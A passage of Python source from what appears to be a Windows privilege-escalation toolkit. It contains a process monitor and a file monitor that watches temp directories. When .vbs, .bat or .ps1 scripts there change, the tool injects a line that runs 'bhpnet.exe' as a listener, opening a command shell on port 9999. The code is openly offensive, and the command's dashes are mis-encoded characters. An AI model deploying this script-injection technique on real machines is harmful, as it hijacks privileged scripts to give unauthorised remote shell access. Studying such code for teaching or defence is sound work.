                cmdline = new_process.CommandLine
                pid = new_process.ProcessId
                parent_pid = new_process.ParentProcessId
                privileges = self.getProcessPrivilages(pid)
                utils.dbgPrint("\nDate: ", Fore.GREEN, dualline=True, secondline="%s" % create_date)
                utils.dbgPrint("Process Owners: ", Fore.GREEN, dualline=True, secondline="%s" % proc_owner)
                utils.dbgPrint("Executable: ", Fore.GREEN, dualline=True, secondline="%s" % executable)
                utils.dbgPrint("Command line: ", Fore.GREEN, dualline=True, secondline="%s" % cmdline)
                utils.dbgPrint("PID: ", Fore.GREEN, dualline=True, secondline="%s" % pid)
                utils.dbgPrint("Parent PID: ", Fore.GREEN, dualline=True, secondline="%s" % parent_pid)
                utils.dbgPrint("Privileges: ", Fore.GREEN, dualline=True, secondline="%s\n" % privileges)
        except KeyboardInterrupt:
            utils.dbgPrint("\n[-] Exited process monitor.\n", Fore.RED)
            return False

    def fileMonitor(self, command):
        if len(command.split()) == 1:
            dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]
        elif len(command.split()) == 2:
            dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir(), str(command.split()[1])]
        else:
            utils.dbgPrint("[-] Improper arguments supplied.", Fore.RED)
            return False
        for path in dirs_to_monitor:
            if dirs_to_monitor[len(dirs_to_monitor)-1] == path:
                utils.dbgPrint("\n[+] Spawning monitoring thread for path: %s\n" % path, Fore.GREEN)
                self.startFileMonitor(path)
                return True
            monitor_thread = threading.Thread(target=self.startFileMonitor, args=(path,))
            monitor_thread.daemon = True
            utils.dbgPrint("\n[+] Spawning monitoring thread for path: %s\n" % path, Fore.GREEN)
            monitor_thread.start()


    def injectCode(self, full_filename, extension, contents):
        file_types = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker", "Start-Process \"%s\"" % command]
        # is our marker already in the file?
        if file_types[extension][0] in contents:
            return
        # no marker let's inject the marker and code
        full_contents = file_types[extension][0]
        full_contents += file_types[extension][1]
        full_contents += contents
        fd = open(full_filename, "wb")
        fd.write(full_contents)
        fd.close()
        utils.dbgPrint("[+] Injected code.", Fore.GREEN)
        return

    def startFileMonitor(self, path_to_watch):
        # we create a thread for each monitoring run
        FILE_LIST_DIRECTORY = 0x0001
        FILE_CREATED = 1
        FILE_DELETED = 2
        FILE_MODIFIED = 3
        FILE_RENAMED_FROM = 4
        FILE_RENAMED_TO = 5
        file_types = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker", "Start-Process \"%s\"" % command]
        h_directory = win32file.CreateFile(
            path_to_watch,
            FILE_LIST_DIRECTORY,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None)
        while 1:
            try:
                results = win32file.ReadDirectoryChangesW(
                    h_directory,
                    1024,
                    True,
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                    win32con.FILE_NOTIFY_CHANGE_SIZE |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                    win32con.FILE_NOTIFY_CHANGE_SECURITY,
                    None,
                    None
                )
                for action, file_name in results:
                    full_filename = os.path.join(path_to_watch, file_name)
                    if action == FILE_CREATED:
                        utils.dbgPrint("\n[+] Created %s" % full_filename, Fore.GREEN)
                    elif action == FILE_DELETED:
                        utils.dbgPrint("\n[-] Deleted %s" % full_filename, Fore.RED)
                    elif action == FILE_MODIFIED:
                        utils.dbgPrint("\n[*] Modified %s" % full_filename, Fore.YELLOW)
                        utils.dbgPrint("\n[*] Dumping contents...", Fore.GREEN, verbose=self.verbose)
                        try:
                            fd = open(full_filename, "rb")
                            contents = fd.read()
                            fd.close()
                            utils.dbgPrint(contents, verbose=self.verbose)
                            utils.dbgPrint("[+] Dump complete.", Fore.GREEN, verbose=self.verbose)
                        except:
                            utils.dbgPrint("[-] Failed dumping file.", Fore.RED, verbose=self.verbose)

                        filename, extension = os.path.splitext(full_filename)

                        if extension in file_types:
                            self.injectCode(full_filename, extension, contents)

                    elif action == FILE_RENAMED_FROM:
                        utils.dbgPrint("[>] Renamed from: %s" % full_filename, Fore.GREEN)
                    elif action == FILE_RENAMED_TO:
                        utils.dbgPrint("[<] Renamed to: %s" % full_filename, Fore.GREEN)
                    else:
                        utils.dbgPrint("[?] Unknown: %s" % full_filename, Fore.GREEN)
            except KeyboardInterrupt:
                    utils.dbgPrint("\n[-] Exited file monitor.\n", Fore.RED)
                    return False